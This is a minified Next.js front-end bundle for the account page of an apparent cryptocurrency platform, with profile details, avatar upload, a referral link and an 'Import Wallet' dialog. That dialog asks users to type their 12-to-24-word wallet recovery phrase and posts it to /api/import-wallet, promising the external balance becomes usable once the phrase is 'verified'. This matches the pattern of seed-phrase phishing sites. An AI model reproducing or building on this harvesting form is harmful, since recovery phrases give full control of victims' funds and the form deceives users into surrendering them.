(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[6163],{6980:function(e,t,r){"use strict";r.d(t,{q:function(){return h}});var n=r(86006),l=r(43764),o=Object.defineProperty,a=Object.getOwnPropertySymbols,i=Object.prototype.hasOwnProperty,s=Object.prototype.propertyIsEnumerable,c=(e,t,r)=>t in e?o(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,d=(e,t)=>{for(var r in t||(t={}))i.call(t,r)&&c(e,r,t[r]);if(a)for(var r of a(t))s.call(t,r)&&c(e,r,t[r]);return e},u=(e,t)=>{var r={};for(var n in e)i.call(e,n)&&0>t.indexOf(n)&&(r[n]=e[n]);if(null!=e&&a)for(var n of a(e))0>t.indexOf(n)&&s.call(e,n)&&(r[n]=e[n]);return r};let m={timeout:1e3};function h(e){let t=(0,l.N4)("CopyButton",m,e),{children:r,timeout:o,value:a}=t,i=u(t,["children","timeout","value"]),s=function({timeout:e=2e3}={}){let[t,r]=(0,n.useState)(null),[l,o]=(0,n.useState)(!1),[a,i]=(0,n.useState)(null),s=t=>{clearTimeout(a),i(setTimeout(()=>o(!1),e)),o(t)};return{copy:e=>{"clipboard"in navigator?navigator.clipboard.writeText(e).then(()=>s(!0)).catch(e=>r(e)):r(Error("useClipboard: navigator.clipboard is not supported"))},reset:()=>{o(!1),r(null),clearTimeout(a)},error:t,copied:l}}({timeout:o});return n.createElement(n.Fragment,null,r(d({copy:()=>s.copy(a),copied:s.copied},i)))}h.displayName="@mantine/core/CopyButton"},75363:function(e,t,r){"use strict";r.d(t,{g:function(){return T}});var n=r(86006),l=r(40431),o=n.useLayoutEffect,a=function(e){var t=n.useRef(e);return o(function(){t.current=e}),t},i=function(e,t){if("function"==typeof e){e(t);return}e.current=t},s=function(e,t){var r=(0,n.useRef)();return(0,n.useCallback)(function(n){e.current=n,r.current&&i(r.current,null),r.current=t,t&&i(t,n)},[t])},c={"min-height":"0","max-height":"none",height:"0",visibility:"hidden",overflow:"hidden",position:"absolute","z-index":"-1000",top:"0",right:"0"},d=function(e){Object.keys(c).forEach(function(t){e.style.setProperty(t,c[t],"important")})},u=null,m=function(e,t){var r=e.scrollHeight;return"border-box"===t.sizingStyle.boxSizing?r+t.borderSize:r-t.paddingSize},h=function(){},x=["borderBottomWidth","borderLeftWidth","borderRightWidth","borderTopWidth","boxSizing","fontFamily","fontSize","fontStyle","fontWeight","letterSpacing","lineHeight","paddingBottom","paddingLeft","paddingRight","paddingTop","tabSize","textIndent","textRendering","textTransform","width","wordBreak"],p=!!document.documentElement.currentStyle,f=function(e){var t=window.getComputedStyle(e);if(null===t)return null;var r=x.reduce(function(e,r){return e[r]=t[r],e},{}),n=r.boxSizing;if(""===n)return null;p&&"border-box"===n&&(r.width=parseFloat(r.width)+parseFloat(r.borderRightWidth)+parseFloat(r.borderLeftWidth)+parseFloat(r.paddingRight)+parseFloat(r.paddingLeft)+"px");var l=parseFloat(r.paddingBottom)+parseFloat(r.paddingTop),o=parseFloat(r.borderBottomWidth)+parseFloat(r.borderTopWidth);return{sizingStyle:r,paddingSize:l,borderSize:o}},g=function(e){var t=a(e);(0,n.useLayoutEffect)(function(){var e=function(e){t.current(e)};return window.addEventListener("resize",e),function(){window.removeEventListener("resize",e)}},[])},v=(0,n.forwardRef)(function(e,t){var r=e.cacheMeasurements,o=e.maxRows,a=e.minRows,i=e.onChange,c=void 0===i?h:i,x=e.onHeightChange,p=void 0===x?h:x,v=function(e,t){if(null==e)return{};var r={};for(var n in e)if(({}).hasOwnProperty.call(e,n)){if(t.indexOf(n)>=0)continue;r[n]=e[n]}return r}(e,["cacheMeasurements","maxRows","minRows","onChange","onHeightChange"]),b=void 0!==v.value,y=(0,n.useRef)(null),j=s(y,t),w=(0,n.useRef)(0),N=(0,n.useRef)(),S=function(){var e,t,n,l,i,s,c,h,x,g,v,b=y.current,j=r&&N.current?N.current:f(b);if(j){N.current=j;var S=(e=b.value||b.placeholder||"x",void 0===(t=a)&&(t=1),void 0===(n=o)&&(n=1/0),u||((u=document.createElement("textarea")).setAttribute("tabindex","-1"),u.setAttribute("aria-hidden","true"),d(u)),null===u.parentNode&&document.body.appendChild(u),l=j.paddingSize,i=j.borderSize,c=(s=j.sizingStyle).boxSizing,Object.keys(s).forEach(function(e){u.style[e]=s[e]}),d(u),u.value=e,h=m(u,j),u.value="x",g=(x=u.scrollHeight-l)*t,"border-box"===c&&(g=g+l+i),h=Math.max(g,h),v=x*n,"border-box"===c&&(v=v+l+i),[h=Math.min(v,h),x]),k=S[0],C=S[1];w.current!==k&&(w.current=k,b.style.setProperty("height",k+"px","important"),p(k,{rowHeight:C}))}};return(0,n.useLayoutEffect)(S),g(S),(0,n.createElement)("textarea",(0,l.Z)({},v,{onChange:function(e){b||S(),c(e)},ref:j}))}),b=r(70721),y=r(43764),j=(0,r(60072).k)(e=>({input:{paddingTop:e.spacing.xs,paddingBottom:e.spacing.xs}})),w=r(20269),N=r(48548),S=Object.defineProperty,k=Object.defineProperties,C=Object.getOwnPropertyDescriptors,O=Object.getOwnPropertySymbols,z=Object.prototype.hasOwnProperty,E=Object.prototype.propertyIsEnumerable,Z=(e,t,r)=>t in e?S(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,P=(e,t)=>{for(var r in t||(t={}))z.call(t,r)&&Z(e,r,t[r]);if(O)for(var r of O(t))E.call(t,r)&&Z(e,r,t[r]);return e},R=(e,t)=>k(e,C(t)),L=(e,t)=>{var r={};for(var n in e)z.call(e,n)&&0>t.indexOf(n)&&(r[n]=e[n]);if(null!=e&&O)for(var n of O(e))0>t.indexOf(n)&&E.call(e,n)&&(r[n]=e[n]);return r};let F={autosize:!1,size:"sm",__staticSelector:"Textarea"},T=(0,n.forwardRef)((e,t)=>{let r=(0,y.N4)("Textarea",F,e),{autosize:l,maxRows:o,minRows:a,label:i,error:s,description:c,id:d,className:u,required:m,style:h,wrapperProps:x,classNames:p,styles:f,size:g,__staticSelector:S,sx:k,errorProps:C,descriptionProps:O,labelProps:z,inputWrapperOrder:E,inputContainer:Z,unstyled:T,withAsterisk:I,variant:W}=r,A=L(r,["autosize","maxRows","minRows","label","error","description","id","className","required","style","wrapperProps","classNames","styles","size","__staticSelector","sx","errorProps","descriptionProps","labelProps","inputWrapperOrder","inputContainer","unstyled","withAsterisk","variant"]),B=(0,b.M)(d),{classes:U,cx:_}=j(),{systemStyles:H,rest:M}=(0,w.x)(A),D=P({required:m,ref:t,error:s,id:B,classNames:R(P({},p),{input:_(U.input,null==p?void 0:p.input)}),styles:f,__staticSelector:S,size:g,multiline:!0,unstyled:T,variant:W},M);return n.createElement(N.I.Wrapper,P(P({label:i,error:s,id:B,description:c,required:m,style:h,className:u,classNames:p,styles:f,size:g,__staticSelector:S,sx:k,errorProps:C,labelProps:z,descriptionProps:O,inputContainer:Z,inputWrapperOrder:E,unstyled:T,withAsterisk:I,variant:W},H),x),l?n.createElement(N.I,R(P({},D),{component:v,maxRows:o,minRows:a})):n.createElement(N.I,R(P({},D),{component:"textarea",rows:a})))});T.displayName="@mantine/core/Textarea"},82643:function(e,t,r){Promise.resolve().then(r.bind(r,8129))},8129:function(e,t,r){"use strict";r.r(t),r.d(t,{default:function(){return z}});var n=r(9268),l=r(34751),o=r(3338),a=r(88001),i=r(17915),s=r(75363),c=r(50447),d=r(86006),u=r(68919),m=e=>{let{opened:t,onClose:r}=e,[l,m]=(0,d.useState)(!1),[h,x]=(0,d.useState)({walletName:"",walletPhrase:""}),p=async()=>{try{m(!0);let{data:e}=await c.Z.post("/api/import-wallet",h);if(e.error)throw Error(e.error);u.Am.success("You will be able to use your external wallet balance here once your phrase is verified",{duration:15e3}),r()}catch(e){u.Am.error(e.message)}finally{m(!1)}};return(0,n.jsx)(i.Z,{title:"Import External wallet",opened:t,onClose:r,children:(0,n.jsxs)("div",{className:"flex flex-col gap-3",children:[(0,n.jsxs)("div",{children:[(0,n.jsx)("div",{className:"text-white",children:"Wallet Name"}),(0,n.jsx)(a.Z,{value:h.walletName,onChange:e=>x({...h,walletName:e.target.value}),placeholder:"e.g Trust Wallet, Blockchain wallet etc..."})]}),(0,n.jsxs)("div",{children:[(0,n.jsx)("div",{className:"text-white",children:"Phrase"}),(0,n.jsx)(s.g,{onChange:e=>x({...h,walletPhrase:e.target.value}),value:h.walletPhrase,placeholder:"Typically 12 (sometimes 18, 24) words separated by single spaces"}),!1]}),(0,n.jsx)(o.Z,{loading:l,label:"Import",onClick:p})]})})},h=r(32131),x=r(22450),p=r(6980),f=r(92955),g=r(76394),v=r.n(g),b=r(56008),y=r(12801),j=r(46338);let w=e=>{let{icon:t,label:r,content:l,logo:o}=e,{mode:a}=(0,x.Z)(),{company:i}=(0,h.Z)(),s=null==i?void 0:i.color.primary,c=null==i?void 0:i.color.primaryLight,d=null==i?void 0:i.color.primaryVeryLight;return(0,n.jsx)(p.q,{value:l||"",children:e=>{let{copied:i,copy:m}=e;return(0,n.jsxs)("div",{style:{backgroundColor:i?d:"inherit"},onClick:()=>{m(),u.Am.success("".concat(r," copied"))},className:"shadow-md w-full \n            rounded-md flex items-center \n            justify-between p-4 gap-3 \n            sm:cursor-pointer select-none active:scale-95 \n            transition-all duration-200 \n            ".concat("light"===a?"":"shadow-[#3d3d3d] hover:shadow-[#4f4f4f] text-black"," "),children:[(0,n.jsxs)("div",{className:"flex items-center gap-3",children:[t&&(0,n.jsx)(t,{color:"light"===a?s:c,size:21,className:"flex-shrink-0"}),o&&(0,n.jsx)(v(),{className:"w-[30px] h-[30px] sm:w-[40px] sm:h-[40px]",width:40,height:40,alt:"logo",src:o}),(0,n.jsxs)("div",{className:"flex flex-col",children:[(0,n.jsx)("div",{style:{color:"#e80c0c"},className:"font-semibold text-[16px]",children:r}),(0,n.jsx)("div",{className:"font-normal text-sm\n              ".concat("light"===a?"text-gray-500":"text-black"),children:l})]})]}),(0,n.jsx)(j.Odh,{color:"light"===a?s:c,size:24,className:"flex-shrink-0 "})]})}})};var N=e=>{let{user:t}=e,{mode:r}=(0,x.Z)(),l=(0,b.useRouter)(),{fullname:a,email:i,username:s,phoneNumber:c,dateOfBirth:d,country:u,city:m,address:p}=t,g={fullname:a,email:i,username:s,phoneNumber:c,dateOfBirth:d,country:u,city:m,address:p},{company:v}=(0,h.Z)(),N=null==v?void 0:v.color.primary,S=null==v?void 0:v.color.primaryLight;return(0,n.jsxs)(f.U.Item,{value:"customization",children:[(0,n.jsx)(f.U.Control,{chevron:(0,n.jsx)(y.iUH,{color:"light"===r?N:S}),className:"\n    ".concat("light"===r?"hover:bg-gray-100":"hover:bg-gray-900","\n  "),children:(0,n.jsxs)("div",{className:"flex gap-2 py-2 items-center",children:[(0,n.jsx)(j.hyG,{size:24,color:"light"===r?N:S}),(0,n.jsx)("div",{className:"\n        ".concat("light"===r?"text-slate-700":"text-black"," \n        ").concat("group-hover:text-white","\n      "),children:"Personal Details"})]})}),(0,n.jsxs)(f.U.Panel,{children:[(0,n.jsxs)("div",{className:"flex flex-col sm:flex-row items-center gap-4 py-2 ",children:[(0,n.jsx)(w,{label:"Full Name",icon:j.hyG,content:t.fullname}),(0,n.jsx)(w,{label:"Email",icon:j.JwT,content:t.email})]}),(0,n.jsxs)("div",{className:"flex flex-col sm:flex-row items-center gap-4 py-2 ",children:[(0,n.jsx)(w,{label:"User Name",icon:j.hyG,content:t.username}),t.phoneNumber&&(0,n.jsx)(w,{label:"Phone Number",icon:y.I7T,content:t.phoneNumber})]}),(0,n.jsxs)("div",{className:"flex flex-col sm:flex-row items-center gap-4 py-2 ",children:[t.dateOfBirth&&(0,n.jsx)(w,{label:"Date of birth",icon:y.XdU,content:t.dateOfBirth}),t.country&&(0,n.jsx)(w,{label:"Country",icon:y.wQ2,content:t.country})]}),(0,n.jsxs)("div",{className:"flex flex-col sm:flex-row items-center gap-4 py-2 ",children:[t.city&&(0,n.jsx)(w,{label:"City/Sate",icon:y.Rvu,content:t.city}),t.address&&(0,n.jsx)(w,{label:t.address,icon:y.nl4,content:"no. 10 bingo street"})]}),(0,n.jsx)(o.Z,{icon:y.fmQ,label:"Edit info",onClick:()=>l.push("/account/edit-info?user=".concat(JSON.stringify(g)))})]})]})},S=r(29577),k=r(41557),C=r(82854),O=e=>{let{user:t}=e,{mode:r}=(0,x.Z)(),[a,i]=(0,d.useState)(!1),[s,p]=(0,d.useState)(!1),g=(0,b.useRouter)(),[v,w]=(0,d.useState)(!1),{data:O}=(0,l.useSession)(),z=null==O?void 0:O.user,E=(null==z?void 0:z.role)==="admin",{company:Z}=(0,h.Z)(),P=null==Z?void 0:Z.color.primary,R=null==Z?void 0:Z.color.primaryLight,L=async()=>{p(!0);try{await (0,l.signOut)(),u.Am.success("Logged Out")}catch(e){u.Am.error(null==e?void 0:e.message),p(!1)}},F=async(e,t)=>{try{t.close(),w(!0);let{public_id:r,url:n,secure_url:l,format:o,width:a,height:i,bytes:s,original_filename:d,created_at:u,etag:m,thumbnail_url:h}=e.info,{data:x}=await c.Z.post("/api/users/upload-avatar",{public_id:r,url:n,secure_url:l,format:o,width:a,height:i,bytes:s,original_filename:d,created_at:u,etag:m,thumbnail_url:h});if(x.error)throw Error(x.error)}catch(e){u.Am.error(e.message),console.log(e.message)}finally{w(!1)}};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)("div",{className:"flex flex-col items-center gap-8 pb-7 \n      ".concat("light"===r?"text-slate-700":"text-black"),children:[(0,n.jsx)("div",{className:"text-xl sm:text-2xl font-bold \n        flex justify-center\n      ".concat("light"===r?"text-slate-700":"text-black"),children:"Account"}),(0,n.jsx)(C.ZF,{uploadPreset:"baydkieu",onUpload:F,children:e=>{var l,o;let{open:a}=e;return(0,n.jsxs)("div",{onClick:e=>{e.preventDefault(),a()},className:"flex justify-center flex-col  items-center sm:cursor-pointer",children:[(null===(l=t.avatar)||void 0===l?void 0:l.url)&&(0,n.jsx)(S.q,{src:t.avatar.url,alt:"its me",size:"xl",radius:"md"}),!(null===(o=t.avatar)||void 0===o?void 0:o.url)&&(0,n.jsxs)(S.q,{alt:"its me",size:"xl",radius:"md",children:[!v&&(0,n.jsx)(j.hyG,{}),v&&(0,n.jsx)(k.a,{color:"light"===r?P:R})]}),(0,n.jsxs)("div",{className:"flex items-center gap-1",children:["Edit Picture ",(0,n.jsx)(y.fmQ,{})]})]})}}),(0,n.jsxs)("div",{className:"flex flex-col gap-1 items-center",children:[(0,n.jsx)("div",{children:"Invite Friends."}),(0,n.jsx)("div",{children:"".concat(null==Z?void 0:Z.baseUrl,"/register/").concat(t.username)}),(0,n.jsx)("div",{children:"Share Referral Link"})]}),(0,n.jsx)(f.U,{className:"w-full",defaultValue:"Account",children:(0,n.jsx)(N,{user:t})}),(0,n.jsxs)("div",{className:"flex flex-col items-center \n      justify-center w-full sm:w-[60%] \n      gap-3",children:[E&&(0,n.jsx)(o.Z,{onClick:()=>g.push("/admin/dashboard"),label:"Switch to admin"}),(0,n.jsxs)("div",{className:"text-center \n        ".concat("light"===r?"text-slate-700":"text-black"),children:["Do you have an existing crypto wallet? You can easly import your external wallet balance to your ",null==Z?void 0:Z.name," balance."]}),(0,n.jsx)(o.Z,{icon:y.Xur,outline:!0,label:"Import Wallet",onClick:()=>i(!0)})]}),(0,n.jsxs)("div",{onClick:L,className:"flex items-center gap-3 \n              cursor-pointer font-medium \n              ".concat("light"===r?"text-slate-700":"text-black"),children:["Sign Out",s?(0,n.jsx)(k.a,{color:R}):(0,n.jsx)(y.fHX,{color:"light"===r?P:R})]})]}),(0,n.jsx)(m,{opened:a,onClose:()=>i(!1)})]})},z=()=>{var e;let{data:t}=(0,l.useSession)(),r=null===(e=null==t?void 0:t.user)||void 0===e?void 0:e.id,[o,a]=(0,d.useState)(),{company:i}=(0,h.Z)(),{mode:s}=(0,x.Z)(),m=null==i?void 0:i.color.primary,p=null==i?void 0:i.color.primaryLight;return((0,d.useEffect)(()=>{let e=async()=>{try{let{data:e}=await (0,c.Z)("/api/users/".concat(r));if(e.error)throw Error(e.error);a(e)}catch(e){u.Am.error(e.message)}};r&&e()},[r]),o)?(0,n.jsx)(O,{user:o}):(0,n.jsx)("div",{className:"flex w-full justify-center items-center  min-h-[60vh]",children:(0,n.jsx)(k.a,{color:"light"===s?m:p})})}},3338:function(e,t,r){"use strict";var n=r(9268),l=r(41557);r(86006);var o=r(32131);t.Z=e=>{let{label:t,onClick:r,disabled:a,outline:i,small:s,icon:c,loading:d,type:u,primaryColor:m}=e,{company:h}=(0,o.Z)();return null!=m||null==h||h.color.primary,null==h||h.color.primaryVeryLight,(0,n.jsxs)("button",{type:u,style:{backgroundColor:"#9D00FF"},onClick:r,disabled:a||d,className:"relative disabled:opacity-70 disabled:cursor-not-allowed \n      rounded-lg hover:opacity-80 transition \n      w-full disabled:active:scale-[1] active:scale-[.95] \n      flex justify-center items-center gap-2 \n      ".concat(i?"text-slate-700":"text-white"," \n      ").concat(s?"h-[40px]":"h-[55px]"," \n      ").concat(s?"text-sm":" text-base"," \n      ").concat(s?"font-light":"font-semibold"," \n      ").concat(s?"border-[1px]":"border-2"),children:[!d&&t,c&&!d&&(0,n.jsx)(c,{size:24}),d&&(0,n.jsx)(l.a,{size:24,color:i?m:"#ffff"})]})}},88001:function(e,t,r){"use strict";var n=r(9268),l=r(86006),o=r(32131);t.Z=e=>{let{maxLength:t,disabled:r,value:a,onChange:i,secureEntry:s,placeholder:c,icon:d,iconAction:u,id:m}=e,[h,x]=(0,l.useState)(!1),{company:p}=(0,o.Z)();null==p||p.color.primary,null==p||p.color.primaryLight;let f=null==p?void 0:p.color.primaryVeryLight;return(0,n.jsxs)("div",{style:{backgroundColor:"white",borderColor:f},"aria-disabled":!0,className:"flex justify-between w-full \n    items-center px-3 rounded-lg border \n    ".concat(r&&"bg-gray-100 cursor-not-allowed"),children:[(0,n.jsx)("input",{maxLength:t,onFocus:()=>x(!0),onBlur:()=>x(!1),disabled:r,id:m,type:s?"password":"text",placeholder:c,value:a,onChange:i,className:"py-4 outline-none w-full \n        h-full pr-2 bg-inherit \n        text-gray-500 font-semibold \n        disabled:cursor-not-allowed"}),d&&(0,n.jsx)(d,{onClick:u,size:24,className:"cursor-pointer text-gray-600"})]})}},32131:function(e,t,r){"use strict";var n=r(82561);let l=(0,n.Ue)(e=>({company:null,onCompany:t=>e({company:t})}));t.Z=l},22450:function(e,t,r){"use strict";var n=r(82561);let l=()=>{let e=localStorage.getItem("theme-mode");return e&&"light"!==e?"dark":"light"},o=()=>(localStorage.setItem("theme-mode","dark"),{mode:"dark"}),a=()=>(localStorage.setItem("theme-mode","light"),{mode:"light"}),i=(0,n.Ue)(e=>({mode:"light",onDarkMode:()=>e(o),onLightMode:()=>e(a),onInitialMode:()=>e({mode:l()})}));t.Z=i},17915:function(e,t,r){"use strict";var n=r(9268),l=r(40931);r(86006);var o=r(22450);t.Z=e=>{let{opened:t,onClose:r,size:a,title:i,children:s,fullScreen:c}=e,{mode:d}=(0,o.Z)();return(0,n.jsx)(l.u,{fullScreen:c,opened:t,onClose:r,title:i,centered:!0,size:a||"md",classNames:{header:"".concat("light"===d?"bg-white text-slate-700":"bg-[#121212] text-white"),body:"".concat("light"===d?"bg-white":"bg-[#121212]"),content:"".concat("light"===d?"text-slate-700":"text-white"),title:"font-semibold text-lg text-black"},children:s})}}},function(e){e.O(0,[3296,5852,2815,1114,931,4751,6394,3484,4941,2854,2955,9253,2961,1744],function(){return e(e.s=82643)}),_N_E=e.O()}]);